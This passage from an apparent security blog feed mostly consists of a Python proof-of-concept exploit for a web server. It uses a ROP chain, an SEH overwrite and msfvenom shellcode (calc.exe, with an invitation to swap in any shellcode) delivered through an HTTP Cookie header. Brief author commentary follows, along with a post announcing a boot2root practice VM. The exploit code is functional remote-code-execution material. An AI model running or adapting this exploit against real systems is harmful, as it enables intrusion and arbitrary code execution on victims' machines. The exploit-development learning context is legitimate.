</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x1001b4f6</span><span class="p">,</span>  <span class="c"># POP ECX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;amp;Writable location [sqlite3.dll]</span>
</span><span class='line'>  <span class="mh">0x100194b3</span><span class="p">,</span>  <span class="c"># POP EDI # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x1001a858</span><span class="p">,</span>  <span class="c"># RETN (ROP NOP) [ImageLoad.dll]</span>
</span><span class='line'>  <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x90909090</span><span class="p">,</span>  <span class="c"># nop</span>
</span><span class='line'>  <span class="mh">0x100240c2</span><span class="p">,</span>  <span class="c"># PUSHAD # RETN [ImageLoad.dll] </span>
</span><span class='line'><span class="p">]</span>
</span><span class='line'><span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&amp;lt;I&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Check</span> <span class="n">command</span> <span class="n">line</span> <span class="n">args</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Usage</span><span class="p">:</span> <span class="n">python</span> <span class="n">poc</span><span class="o">.</span><span class="n">py</span> <span class="p">[</span><span class="n">host</span><span class="p">]</span> <span class="p">[</span><span class="n">port</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">exit</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offsets</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">rop_offset</span> <span class="o">=</span> <span class="mi">2455</span>
</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">move</span> <span class="n">ESP</span> <span class="n">out</span> <span class="n">of</span> <span class="n">the</span> <span class="n">way</span> <span class="n">so</span> <span class="n">the</span> <span class="n">shellcode</span> <span class="n">doesn</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="n">corrupt</span> <span class="n">itself</span> <span class="n">during</span> <span class="n">execution</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">metasm</span> <span class="o">&gt;</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span><span class="o">-</span><span class="mi">1500</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">=</span>  <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x81</span>\<span class="n">xc4</span>\<span class="n">x24</span>\<span class="n">xfa</span>\<span class="n">xff</span>\<span class="n">xff</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Just</span> <span class="k">as</span> <span class="n">a</span> <span class="n">PoC</span><span class="p">,</span> <span class="n">spawn</span> <span class="n">calc</span><span class="o">.</span><span class="n">exe</span><span class="o">.</span> <span class="n">Replace</span> <span class="k">with</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">shellcode</span> <span class="n">you</span> <span class="n">want</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">(</span><span class="n">maximum</span> <span class="n">size</span> <span class="n">of</span> <span class="n">shellcode</span> <span class="n">allowed</span><span class="p">:</span> <span class="mi">1260</span> <span class="nb">bytes</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="k">exec</span> <span class="n">CMD</span><span class="o">=</span><span class="n">calc</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">b</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x3b</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">-</span><span class="n">f</span> <span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Payload</span> <span class="n">size</span><span class="p">:</span> <span class="mi">220</span> <span class="nb">bytes</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xbb</span>\<span class="n">xde</span>\<span class="n">x37</span>\<span class="n">x73</span>\<span class="n">xe9</span>\<span class="n">xdb</span>\<span class="n">xdf</span>\<span class="n">xd9</span>\<span class="n">x74</span>\<span class="n">x24</span>\<span class="n">xf4</span>\<span class="n">x58</span>\<span class="n">x31</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc9</span>\<span class="n">xb1</span>\<span class="n">x31</span>\<span class="n">x31</span>\<span class="n">x58</span>\<span class="n">x13</span>\<span class="n">x83</span>\<span class="n">xe8</span>\<span class="n">xfc</span>\<span class="n">x03</span>\<span class="n">x58</span>\<span class="n">xd1</span>\<span class="n">xd5</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x86</span>\<span class="n">x15</span>\<span class="n">x05</span>\<span class="n">x9b</span>\<span class="n">x69</span>\<span class="n">xe6</span>\<span class="n">xd5</span>\<span class="n">xfc</span>\<span class="n">xe0</span>\<span class="n">x03</span>\<span class="n">xe4</span>\<span class="n">x3c</span>\<span class="n">x96</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x40</span>\<span class="n">x56</span>\<span class="n">x8d</span>\<span class="n">xdc</span>\<span class="n">x05</span>\<span class="n">x5a</span>\<span class="n">x66</span>\<span class="n">xb0</span>\<span class="n">xbd</span>\<span class="n">xe9</span>\<span class="n">x0a</span>\<span class="n">x1d</span>\<span class="n">xb1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5a</span>\<span class="n">xa0</span>\<span class="n">x7b</span>\<span class="n">xfc</span>\<span class="n">x5b</span>\<span class="n">x99</span>\<span class="n">xb8</span>\<span class="n">x9f</span>\<span class="n">xdf</span>\<span class="n">xe0</span>\<span class="n">xec</span>\<span class="n">x7f</span>\<span class="n">xde</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2a</span>\<span class="n">xe1</span>\<span class="n">x7e</span>\<span class="n">x27</span>\<span class="n">x56</span>\<span class="n">x08</span>\<span class="n">xd2</span>\<span class="n">xf0</span>\<span class="n">x1c</span>\<span class="n">xbf</span>\<span class="n">xc3</span>\<span class="n">x75</span>\<span class="n">x68</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x7c</span>\<span class="n">x6f</span>\<span class="n">xc5</span>\<span class="n">x7c</span>\<span class="n">x04</span>\<span class="n">x8c</span>\<span class="n">x9d</span>\<span class="n">x7f</span>\<span class="n">x25</span>\<span class="n">x03</span>\<span class="n">x96</span>\<span class="n">xd9</span>\<span class="n">xe5</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xa5</span>\<span class="n">x7b</span>\<span class="n">x52</span>\<span class="n">xac</span>\<span class="n">xbd</span>\<span class="n">x98</span>\<span class="n">x5f</span>\<span class="n">x66</span>\<span class="n">x35</span>\<span class="n">x6a</span>\<span class="n">x2b</span>\<span class="n">x79</span>\<span class="n">x9f</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xa3</span>\<span class="n">xd4</span>\<span class="n">xd6</span>\<span class="n">xde</span>\<span class="n">x0c</span>\<span class="n">x27</span>\<span class="n">x26</span>\<span class="n">x26</span>\<span class="n">xaa</span>\<span class="n">xd8</span>\<span class="n">x5d</span>\<span class="n">x5e</span>\<span class="n">xc9</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x65</span>\<span class="n">x66</span>\<span class="n">xa5</span>\<span class="n">xb0</span>\<span class="n">xb1</span>\<span class="n">xe3</span>\<span class="n">x3e</span>\<span class="n">x12</span>\<span class="n">x31</span>\<span class="n">x53</span>\<span class="n">x9b</span>\<span class="n">xa3</span>\<span class="n">x96</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x02</span>\<span class="n">x68</span>\<span class="n">xaf</span>\<span class="n">x53</span>\<span class="n">x40</span>\<span class="n">x36</span>\<span class="n">xb3</span>\<span class="n">x62</span>\<span class="n">x85</span>\<span class="n">x4c</span>\<span class="n">xcf</span>\<span class="n">xef</span>\<span class="n">x28</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x83</span>\<span class="n">x46</span>\<span class="n">xab</span>\<span class="n">x0e</span>\<span class="n">x07</span>\<span class="n">x03</span>\<span class="n">x6f</span>\<span class="n">x2e</span>\<span class="n">x1e</span>\<span class="n">xe9</span>\<span class="n">xde</span>\<span class="n">x4f</span>\<span class="n">x40</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x52</span>\<span class="n">xbe</span>\<span class="n">xf5</span>\<span class="n">x0a</span>\<span class="n">x7e</span>\<span class="n">xab</span>\<span class="n">x87</span>\<span class="n">x50</span>\<span class="n">x14</span>\<span class="n">x2a</span>\<span class="n">x15</span>\<span class="n">xef</span>\<span class="n">x5a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2c</span>\<span class="n">x25</span>\<span class="n">xf0</span>\<span class="n">xca</span>\<span class="n">x45</span>\<span class="n">x14</span>\<span class="n">x7b</span>\<span class="n">x85</span>\<span class="n">x12</span>\<span class="n">xa9</span>\<span class="n">xae</span>\<span class="n">xe2</span>\<span class="n">xed</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xe3</span>\<span class="n">xf3</span>\<span class="n">x42</span>\<span class="n">x66</span>\<span class="n">xaa</span>\<span class="n">x61</span>\<span class="n">xd7</span>\<span class="n">xeb</span>\<span class="n">x4d</span>\<span class="n">x5c</span>\<span class="n">x1b</span>\<span class="n">x12</span>\<span class="n">xce</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x55</span>\<span class="n">xe3</span>\<span class="n">xe1</span>\<span class="n">xce</span>\<span class="n">x1f</span>\<span class="n">xe6</span>\<span class="n">xae</span>\<span class="n">x48</span>\<span class="n">xf3</span>\<span class="n">x9a</span>\<span class="n">xbf</span>\<span class="n">x3c</span>\<span class="n">xf3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x09</span>\<span class="n">xbf</span>\<span class="n">x14</span>\<span class="n">x90</span>\<span class="n">xcc</span>\<span class="n">x53</span>\<span class="n">xf4</span>\<span class="n">x79</span>\<span class="n">x6b</span>\<span class="n">xd4</span>\<span class="n">x9f</span>\<span class="n">x85</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nb">buffer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">rop_offset</span>                       <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">seh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                                <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mh">0x1002280a</span><span class="p">)</span>         <span class="c"># overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mh">0xffffffff</span><span class="p">)</span>         <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>        <span class="c"># padding&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">httpreq</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">GET</span> <span class="o">/</span><span class="n">changeuser</span><span class="o">.</span><span class="n">ghp</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">4.0</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Host</span><span class="p">:</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">en</span><span class="o">-</span><span class="n">us</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Referer</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://&quot;</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="o">//&lt;/</span><span class="n">a</span><span class="o">&gt;&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Cookie</span><span class="p">:</span> <span class="n">SESSIONID</span><span class="o">=</span><span class="mi">6771</span><span class="p">;</span> <span class="n">UserID</span><span class="o">=&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;;</span> <span class="n">PassWD</span><span class="o">=</span><span class="p">;</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Conection</span><span class="p">:</span> <span class="n">Keep</span><span class="o">-</span><span class="n">Alive</span>\<span class="n">r</span>\<span class="n">n</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Send</span> <span class="n">payload</span> <span class="n">to</span> <span class="n">the</span> <span class="n">server</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">httpreq</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>I had a lot of fun writing the exploit, I learnt couple new things and also treated it as a bit of a practice after what I&rsquo;ve learned at the before mentioned <a href="https://www.corelan-training.com/index.php/training-2/bootcamp/">Corelan Bootcamp</a> training (which was <strong>AWESOME</strong> and would highly recommend it to anyone interested in exploit development).</p>

<p>Next on the cards is converting the above exploit into Metasploit module and finding some other PoC&rsquo;s that I may be able to convert to properly working exploits.</p>

<p>Ah, only if I could fit some more hours in the day!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pegasus Has Arrived - My First Boot2root VM]]></title>
    <link href="http://blog.knapsy.com/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/"/>
    <updated>2014-12-16T21:54:34+11:00</updated>
    <id>http://blog.knapsy.com/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm</id>
    <content type="html"><![CDATA[<p>It&rsquo;s here! My first boot2root VM, inspired by various CTFs I attended this year and couple cool things I learnt, is finally here! Go and grab it from <a href="https://www.vulnhub.com/entry/pegasus-1,109/">here (via VulnHub)</a>.</p>

<!-- more -->


<h2>Overview</h2>

<p>Without giving out too much, I tried to design it the way it will exercise your patience and force you to think outside the box. Sometimes the obvious is not the right solution and sometimes the fundamentals and creativity pay off.</p>

<p>Huge thanks to <a href="https://twitter.com/g0tmi1k">g0tmi1k</a> for hosting the VM and a massive shoutout to <a href="https://twitter.com/iMulitia">mulitia</a> for beta-testing it!</p>

<p>Why the name? No particular reason&hellip; seemes like some of the VMs at <a href="https://www.vulnhub.com/">VulnHub</a> got their names from mythology, so just jumped on the bandwagon :)</p>

<p>Feel free to hit me up with some feedback, I&rsquo;d love to hear from you!</p>
]]></content>
  </entry>
  
</feed>
